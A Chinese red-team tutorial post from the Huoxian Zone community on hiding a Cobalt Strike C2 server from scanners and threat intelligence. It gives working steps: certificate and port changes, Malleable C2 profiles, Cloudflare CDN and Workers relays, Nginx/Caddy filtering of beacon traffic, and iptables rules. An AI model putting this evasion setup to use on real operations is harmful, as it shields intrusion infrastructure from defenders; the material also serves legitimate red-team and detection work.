<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/K95VOz2m1J6wTUtsktD3gQ)

文章首发于：

火线 Zone 社区（https://zone.huoxian.cn/）

**01**

NEWS

**前言**

这年头打个红队都不容易，想普普通通上个线，除了 ByPassAV 以外，还要应付各种流量审计和设备和威胁情报，一不留神 VPS 就被扒光了。最近也是一直在倒腾，看了很多文章，但没一个能完全满足要求，或者是按着指示走着走着发现掉坑里了，嗯。  

本文将通过各种手段一步步将 C2 的痕迹从网络空间中抹除，并详细记录一下过程，确保人人都能学会。我也按照工作量的大小划分了几个档位，可以按需选取方案。

**02**

NEWS

**我的环境**

CS 4.3  

centos 7

nginx/1.20.1

caddy v2.4.6

开始之前，想说明的是基本方案和普通方案都是网上一抓一大把，基本也都能成功。这里只是整合，以及介绍一些坑点。不会过多介绍原理，感谢师傅们的文章。

**03**

NEWS

 **基本方案：更改端口与证书**

**更改端口**

```
vim your_cs_path/teamserver
```

拉到最后可以看到启动 CS 的命令，将这个命令的 50050 改掉，换成自己喜欢的端口：

```
java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=2333 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -Duser.language=en -javaagent:hook.jar -classpath ./cobaltstrike.jar server.TeamServer $*
```

**更改证书**

**方法一：使用 keytool（不推荐）**

修改 CS 文件夹中的 cobaltstrike.store，输入如下命令后输入密码 123456 即可列出信息：  

```
keytool -list -v -keystore cobaltstrike.store
```

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1LbBlkT77QtXT5pZg0Gb28OBTThiaSF5PLcYjpI7rMu12NicF1Ssibpy7w/640?wx_fmt=png)

我们可以使用如下命令对该 keystore 进行修改：

```
keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.cn -dname "CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN"

# 参数说明如下
# -keytool -keystore cobaltstrike.store -storepass 密码
# -keypass 密码
# -genkey -keyalg RSA
# -alias google.com -dname CN=(名字与姓氏),
# OU=(组织单位名称), O=(组织名称),
# L=(城市或区域名称),
# ST=(州或省份名称),
# C=(单位的两字母国家代码)。
```

再次查看，能够发现特征已经被去除：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1qkE4WFtwyLuzPENs4IbzLUVcmOtCMbSh0fbNwXYgHVO6KWiaj5oFmAA/640?wx_fmt=png)

**方法二：使用第三方提供的证书生成 keystore（推荐）**

这个会在下面的几节中提到。  

**04**

NEWS

**普通方案使用 Profile 与 CDN**

**域名申请（购买）与配置**

免费的域名可以去 Freenom 要一个，也可以去 Godaddy 花十多块钱买一个。有了域名后直接接入 Cloudflare，需要说明的是 freenom 的域名有的时候不能被 Cloudflare 识别，出现如下报错：  

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1PEcp6KbWk9WwrDibEpmC74lkm2OcOARYZYmVeaebqWVjXVelyaW8XNQ/640?wx_fmt=png)

遇到这种情况可以多申请几个网站或者过一段时间再试试，反正也不花钱。

我遇到的情况是同一个免费域名，一开始接入 Cloudflare 的时候报如上错误，过了三天再尝试接入就成功了。

接入后更改 NS，按照 Cloudflare 的指示将域名的 NS 设置成 Cloudflare 的即可，这里不再赘述。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg17YCBt9MxDEffQ249X0ibCb0nMQlhQ3ibTTTElibMsngSsaBkASnvib8wpQ/640?wx_fmt=png)

接入后配置一个 DNS 的 A 记录，解析到 VPS 的 IP，后续上线用。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1Q3cFP5iaOMGqHDvFy0jQ1cF4hYKT450DLkQzicgjHibzaDzo6AjPRNRpw/640?wx_fmt=png)

**Profile**

Github 上已经有非常多优秀的 C2-Profile 可以供我们使用了，我们需要使用 Profile 让 Beacon 和 Teamserver 之间的交互看起来尽可能像正常的流量。

*   https://github.com/rsmudge/Malleable-C2-Profiles  
    
*   https://github.com/threatexpress/malleable-c2
    

这里我使用的是后者 jquery 的 profile。下载下来后需要根据我们的域名对 Profile 进行修改，以便能够上线 HTTP/HTTPS BEACON。需要修改的内容主要有四处，一个是 https-certificate 块中更改 keystore 和密码，keystore 的生成马上讲：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1veYFicnpr1UkCk31fyrPsJU5ib7zL5uaamutiaJySqb93V84n6eD2ichIQ/640?wx_fmt=png)

另外三个是 http-stager、http-get、http-post 块中的 Host Header，Referer 改不改可以随意。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1HebkkNr7o0nhenGruwkicoR9oUTOd9U5N59MCBSvXM4vUJosgff3Ixw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1TLty4v2BsaUGqplvOmuJXJrtLJlUGicZp8Qia06UxaYibQwfqx08vd4aQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1Iy97NVU3JBfKu1p38MjmzVBZZtkDJkC8RBwV1Pr2R4zBxO2IVYbehw/640?wx_fmt=png)

保存修改，然后准备我们的 keystore。因为接入了 CDN，所以证书我推荐直接使用 Cloudflare 提供的证书。CDN 的坑会在下面讲。当然要是没有接入 CDN 的打算，可以使用 letsencrypt 这样的免费证书。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1dy6PIZxO2k3n3iaOMoQYlibvLsP6ZATicADibiba5iaQ278JCHR3Lg6UQIOQ/640?wx_fmt=png)

使用默认配置生成证书和秘钥后，复制粘贴到你的服务器上，这里我选择的文件名是 server.pem 和 server.key。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1UrN1ayc9ia7F6jnB2OsUzGicvibesUhjiaibib23XvOrS1wjTSUkPCJibXAOQ/640?wx_fmt=png)

```
# 这里cdn.xxx.club是我的域名
openssl pkcs12 -export -in server.pem -inkey server.key -out cdn.xxx.club.p12 -name cdn.xxx.club -passout pass:123456
```

```
keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore cdn.xxx.club.store -srckeystore cdn.xxx.club.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias cdn.xxx.club
```

在生成 keystore 文件后将该文件放在 CS 的根目录下，务必确保 keystore 文件名与密码和 https-certificate 中设置的一致。

在一切准备就绪后可以使用 CS 自带的 c2lint 对 profile 语法进行检查，没有报错的话说明配置是 ok 的。

```
./c2lint jquery-c2.4.3.profile
```

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1yQH0eiaas2yRxMQM1b8tP0FwEHNySbGYf4oTsdzVlJiatc9mxaic9ibNvg/640?wx_fmt=png)

**CDN**

**CDN 配置**

Cloudflare 默认的 TLS 配置为灵活，由于之前使用了 Cloudflare 给原服务器发的证书，我们可以改成完全（严格）提高安全性。  

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1cqwwL9JYkLNKHjBIfxVG9yNm7fBU0ILiceSXajwo77LK4XLlALwvkibQ/640?wx_fmt=png)

**额外配置（坑）**

其他的 Profile 我还没测试过，但是应该都是通用的。

**禁用缓存**

在这个 Profile 中，我们请求的 URI 是以. js 结尾的，Cloudflare 作为一个 CDN 肯定要去缓存它，但这样的话请求就无法到达我们的 CS 服务器，自然也就无法上线了。我们可以使用开发模式并清除缓存，但是开发模式只有 3 小时。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1P2Ztqsd3jfVLic3cs0su3eFHvFParN1BiaTtVqXuh4hML1E9r8zsmbjw/640?wx_fmt=png)

所以推荐的做法是创建 Cloudflare 规则，不代理 js 请求。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1sYQXHaCtHeC1W7B52Gvicn50ZeiaYW4gwvIRKLnxvWKvQ9qyzlw6K3Tw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1xvUxibzoZ72m0FvjiaV88PNib7zzibaiaSXTfH4YWnwkll8vRQJ39SKdN8Q/640?wx_fmt=png)

**Profile 微调**

据说在 4.0 版本的 CS 中，如果不调整 Profile 是可以上线，但是执行命令没有回显。而在 4.3 版本的 CS 中，不动 Profile 是直接上不了线。

我们需要更改 Profile 中的响应头配置，其中的 header "Content-Type" "application/javascript; charset=utf-8"; 修改为：header "Content-Type" "application/*; charset=utf-8"; 即可正常执行命令回显。这里还是 CDN 的问题，但它具体做了什么让我们上不了线就不知道了。  

**测试**

启动 teamserver，设置 profile 为我们修改好的 profile  

```
./teamserver your_ip your_pass jquery-c2.4.3.profile
```

在确保域名解析正确的情况下，此时 HTTPS BEACON 已经可以上线了，我们需要对 CS 的 listener 进行配置。填入三次你的域名，其他的默认就好。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg16m6zJOCV2AMClF22Wz6J1HChOng8NBMqA81MgNBVXmbbMFkquA1CBw/640?wx_fmt=png)

生成 beacon 测试，成功上线：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1CCyn2pbqYeJf63Pic19cjglLq6xAIYicPY8cdJOds2LY8iciaHfQ25lVqQ/640?wx_fmt=png)

**补充 1**

有的师傅 443 端口是有用处的，需要改成其他的端口。这里需要注意的是免费版的 Cloudflare 对代理的端口有限制。我们只能成如下端口：

*   http：80、8080、8880、2052、2082、2086、2095
    
*   https：443、2053、2083、2087、2096、8443
    

**补充 2**

以上针对的是 https 的 beacon，http 的话在 DNS 中加一个二级域名并使用该二级域名上线即可。不用额外再弄一个 profile，因为 http 的 beacon 只看域名。 在 http 的 raw payload 中我们可以验证这一点：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1YOkzf7UDBmNiaPMWpJfAHLY2wY4EakbG9lSiagiaPLWm5mibSdpWl9r8hg/640?wx_fmt=png)

对比 https 的 raw payload，它用上了我们之前配置的所有内容：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1aQHWJjFA6ztljdJUzNsZq0Q1TbXQKwWDAkYVIpZIN4HNq0JQGomsEQ/640?wx_fmt=png)

**05**

NEWS

**高级方案**

**反向代理与 Cloudflare Workers**

其实原本这一切就已经结束了。但是在我倒腾完的第 n 天早上收了一个邮件。大意是说我违反了政策，然后让我去主机管理面板看细节。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1wWgHZ1HficKMmjSfFhLCBVVol92KwjcOEw9wSu8rksD6FzJplLfYbgA/640?wx_fmt=png)

细节的内容已经找不到了，但大体是说你的服务器与一个攻击行为有关。然后给我丢了一个 shodan 的链接。我点进去一看，好家伙，给我分析得明明白白，直接扒光了。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1ibWueJ2glqsQj5ZPfzIqQPa6z5letibXhO9mUxRbsmddshx1kUK3kkwQ/640?wx_fmt=png)

我尝试理解了一下发生了什么，发现无法理解。

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1oYAoklmYW7qiaZ9a2s5ESwGLwZXqHVrKMA4MiaL6xrRvHVb1QTpbVUjQ/640?wx_fmt=jpeg)

然后查了一下资料，具体就是 CS 的 stage 马上线时，默认会向一个符合 checksum8 规则的路径发起请求，随后服务器会响应各种 Payload 数据。checksum8 规则路径大概就长这样：

```
/x9cI/
/fYKR/
/Mrm0/
/wQPD/
/yDHX/
/BCre/
/WHVh/
```

然后，虽然我们在 Profile 中配置了 URI，但是默认的 URI 并没有失效。该默认 URI 依旧可以执行下发任务，上线等一系列操作。我拿 nmap 脚本跑了一下，发现确实被扒光了。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1RhBkcyLWAK8ExF5MRF0d5K1DPC9gAoJKD0PicmLOf48MhpMjKvMlVvA/640?wx_fmt=png)

解决方案的话也有，一个是用二进制手段对 CS 源码进行改造。一个是使用反向代理服务器禁用这个 checksum8 规则路径。由于不会二进制，这里我选择第二种方案。

**反向代理**

反向代理选的套件看了看网上都是清一色的 Nginx，不过这回为了兼容某些应用我使用了 Caddy。Caddy 的好处是配置简单，不像 Nginx 的配置看起来头大。不过我同样对 Nginx 进行了测试，最后无论是 Nginx 还是 Caddy 都能成功上线。

**Nginx**

可以使用

https://github.com/threatexpress/cs2modrewrite 提供的脚本生成：

```
python3 ./cs2nginx.py -i havex.profile -c https://127.0.0.1:8443 -r https://www.baidu.com -H cdn.xxxx.club
```

对各个参数进行说明，如下

*   -i 为模板文件，这个固定的，可以不用管。
    
*   -c 为后端 CS 绑定的端口，这个会在后面 CS 的配置中有所体现
    
*   -r 为不合要求的访问 302 重定向去的位置，这里填了百度
    
*   -H 为你的域名，这里就是你配的那个
    

在配置完后，需要配置 ssl 证书：

```
#####################
# SSL Configuration
#####################
listen 443 ssl;
listen [::]:443 ssl;
ssl on;

ssl_certificate /root/tool/CS/https/server.pem; # 改这个
ssl_certificate_key /root/tool/CS/https/server.key; # 改这个
ssl_session_cache shared:le_nginx_SSL:1m; # managed by Certbot
ssl_session_timeout 1440m; # managed by Certbot
ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # managed by Certbot
ssl_prefer_server_ciphers on; # managed by Certbot
```

同时的话还可以定制化处理 location 块，使得只有指定 URL 才能访问，保证了不会被扫到。指定 User-Agent 可以确保的都是 Beacon 而不是其他的奇怪的东西，有点白名单的意思了。

```
location ~ ^(/jquery-3\.3\.1\.slim\.min\.js|/jquery-3\.3\.2\.min\.js|/jquery-3\.3\.1\.min\.js|/jquery-3\.3\.2\.slim\.min\.js)$ {
        if ($http_user_agent != "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko") {
        return 302 $REDIRECT_DOMAIN$request_uri;
        }
        proxy_pass          $C2_SERVER;

        # If you want to pass the C2 server's "Server" header through then uncomment this line
        # proxy_pass_header Server;
        expires             off;
        proxy_redirect      off;
        proxy_set_header    Host                $host;
        proxy_set_header    X-Forwarded-For     $proxy_add_x_forwarded_for;
        proxy_set_header    X-Real-IP           $remote_addr;
}
```

这里还要注意的是这里的 Nginx 宜以 root 权限运行，默认生成的文件是 www-data 用户。使用该用户可能会有权限问题，这也是大多数人使用反向代理后 https 无法上线的原因。当然最重要的还是要学会看 Nginx 错误日志，至少能定位到问题在哪：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1P51332xOMNkfMU3s1BdBQialqEAsib9G6ADMDHN6WWBRPYzbFSwjg4rQ/640?wx_fmt=png)

当时我是报了一个 (13: Permission denied) while reading upstream 的错误，改成 root 运行 Nginx 后就好了，但现在重新用回 www-data 后也不报错了。。 推测是某些临时文件的属主变了吧。

该配置经过测试能够成功上线，CS 配置如下。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1ezYV55MDVxoOEnkNRC8YoaAhkib9a9gR60icibJibeFyanhklFgG0YeDibQ/640?wx_fmt=png)

**Caddy**

caddy 的配置就简单的多，这里直接贴配置文件。没有 Caddy 可以装一个：

```
yum install caddy
```

```
vim /etc/caddy/Caddyfile
```

```
cdn.xxxx.club {
        tls /root/tool/CS/https/server.pem /root/tool/CS/https/server.key
        reverse_proxy /jquery-3.3* https://127.0.0.1:8443 {
               transport http {
                        tls
                        tls_insecure_skip_verify
                }
        }
}
```

**这里说明一下各个主要指令的作用：**

*   最外面的 tls：启用 tls 连接，这里的 tls 连接是指下游连接，即和 Cloudflare 的 CDN 服务器的连接。证书和秘钥是 Cloudflare 给的那个。
    
*   reverse_proxy：反向代理。
    
*   里面的 tls：同样是使用 tls 连接。
    
*   tls_insecure_skip_verify：我们使用的生成 keystore 的证书同样是 Cloudflare 签发的那个，这里的 tls 连接是 Caddy 和 CS 服务器的连接，由于 Cloudflare 签发的证书是不受（除 Cloudflare 以外的机构）信任的，亦即该证书在 Caddy 看来是不受信任的，连接是不安全的。我们需要加上 tls_insecure_skip_verify 指定，否则 Caddy 将在握手阶段就终止该 https 连接。并报不受信任的证书错误。
    

```
2021/11/16 12:09:01.975 ERROR   http.log.error  x509: cannot validate certificate for 127.0.0.1 because it doesn't contain any IP SANs
```

该配置经过测试能够成功上线。CS 配置和 nginx 中所提到的相同。

**配置 Iptables**

我们的 listener 监听的是 0.0.0.0，我们应该配置成只能让反向代理套件访问。否则像 shodan 这样的搜索引擎或者我们自己拿 nmap 脚本去扫端口的话依旧能够分析出 beacon 信息。可以使用如下命令配置 iptables，要是云厂商提供防火墙的话也可以在那边的防火墙进行配置。

```
iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPT
iptables -A INPUT -p tcp --dport 8443 -j DROP

iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8880 -j ACCEPT
iptables -A INPUT -p tcp --dport 8880 -j DROP
```

现在再拿脚本进行测试的话，就发现扫不出任何东西了：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg13bGlrQOeZEWbgCnWT2m1cmialicH49XUOjZNN8nc6v2sEKXV6UMF4csw/640?wx_fmt=png)

**Cloudflare Workers**

这个有点类似域前置，但是有域前置还是用域前置的好。使用 Cloudflare Workers 可以隐藏我们的真实域名。

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg10neFQ7QqicfKUdvjF41icjAkeDQjmWNU5nlckDMJc5ZFSqzSyjUtSYNQ/640?wx_fmt=png)

申请好子域后创建服务：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1d522icyRThhJtuDMQDRfxENoHqdJr1Xw41xDJrQH4CGa4rFpbECKSdQ/640?wx_fmt=png)

创建好服务后点击快速编辑：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg10e6AqQMquuC59iaoDQlw1ll3XwHcbPRWaSlLlM0IBT22JS6LE1shCKg/640?wx_fmt=png)

并粘贴如下脚本：

```
let upstream = 'https://cdn.xxxx.club' # 这里写你的域名

addEventListener('fetch', event => {
    event.respondWith(fetchAndApply(event.request));
})

async function fetchAndApply(request) {
    const ipAddress = request.headers.get('cf-connecting-ip') || '';
    let requestURL = new URL(request.url);
    let upstreamURL = new URL(upstream);
    requestURL.protocol = upstreamURL.protocol;
    requestURL.host = upstreamURL.host;
    requestURL.pathname = upstreamURL.pathname + requestURL.pathname;

    let new_request_headers = new Headers(request.headers);
    new_request_headers.set("X-Forwarded-For", ipAddress);
    let fetchedResponse = await fetch(
        new Request(requestURL, {
            method: request.method,
            headers: new_request_headers,
            body: request.body
        })
    );
    let modifiedResponseHeaders = new Headers(fetchedResponse.headers);
    modifiedResponseHeaders.delete('set-cookie');
    return new Response(
        fetchedResponse.body,
        {
            headers: modifiedResponseHeaders,
            status: fetchedResponse.status,
            statusText: fetchedResponse.statusText
        }
    );
}
```

之后使用右侧的域名替换 CS 中 https beacon 的三个域名即可：

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1H9zfsylDR5d4mlQ7Levg5PKuYvetU5dbtJ2icYjWVFNwPIhuDCaLfEg/640?wx_fmt=png)

经过测试能够成功上线。

**参考文献：**

1.Cobalt Strike 去特征：配置 Nginx 反向代理、CDN 与 Cloudflare Worker

2. 检测与隐藏 Cobaltstrike 服务器

**【火线—白帽技术交流群】**

进群可以与技术大佬互相交流

进群有机会免费领取节假日礼品

进群可以免费观看技术分享直播

进群方式如下 2 种

⬇️

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg119sSUqcrXqGUyxrg0ia5xnNcTr6aMOXc3RnoEXnCjemDNTyJ3fByGicA/640?wx_fmt=jpeg)

**1. 识别二维码直接进群**

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1ibL4ibrQcEar2yMGJm8Ql6q0clpia3hWgPzSXejANVOEDhJu4wlYQicuAw/640?wx_fmt=jpeg)

**2. 回复【交流群】进群**

**【火线 zone 社区周激励】**

2021.12.20 ～ 2021.12.26 公告

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaSh4C6Eic9KmgKIicj4ib3TDg1odVd5n6YMkJVibRiclm9E64LMm9ZunVIic6l3JSAo2hsd602BWICPrV5w/640?wx_fmt=png)

**【相关精选文章】**

[![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaRjO1stakmEPcib5r8WUgFlFML6VK2KEhnl67olp2dBSAFkELa7CciadENXnKbNz44lGEZmjXtp8Cgg/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490609&idx=1&sn=3fb2da04664e57c5aac204bd8c54bebb&chksm=eaaa9411dddd1d07f6095b5ce176afa592879f279d0f6dd9c396addad374ce632e060d82f767&scene=21#wechat_redirect)

  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaSbtOdh5nXHf5SvicnmEmOyef8AJTFtibI8Kbnqiaia9qIfxiafuDbiaArBHsiaao9iaQNfOyibryVygpOfVGA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247490431&idx=1&sn=89bcc0f5806742c5b178e8714ed810a7&chksm=eaaa935fdddd1a49d1fc5a50b376a6b5fe5cc2642cd4f328c0573138c16fe30cd506d2daf750&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaT9qajZEpJoyYZ5vMmwfn8k7R234VXFHS0PnPgmZzXic49ibuplHiahmDic7CApRnnTC2gosqkQX9pxkw/640?wx_fmt=png)

火线 Zone 是 [火线安全平台] 运营的封闭式实战安全攻防社区，研究讨论实战攻防技术，平台向顶尖的白帽子提供安全测试的云端基础设施，目前火线的高级白帽子数量已经近万人，欢迎具备分享和探索精神的白帽子加入火线 Zone 社区，共建一个有技术氛围的优质社区！

如需转载火线 Zone 公众号内的文章请联系火线小助手：hxanquan（微信）

![](https://mmbiz.qpic.cn/mmbiz_jpg/0Z0LqMyVGaT9qajZEpJoyYZ5vMmwfn8kTI5ve44cydiaOTRkD477Vibiby3YVGPDkziaTDmGV0V54BNCDe4A2ibLrhw/640?wx_fmt=jpeg)

 **微信号** 

huoxian_zone

![](https://mmbiz.qpic.cn/sz_mmbiz_gif/YxSSnpu6MW0CIoKC0f9U1ALN0bHmzzVfdqHmAlujAniaYos5t6H3zUomx1QoILFNCMdeV5eknVH2AfsYvjfV6iag/640?wx_fmt=gif)

点击阅读原文，加入社区，共建一个有技术氛围的优质社区！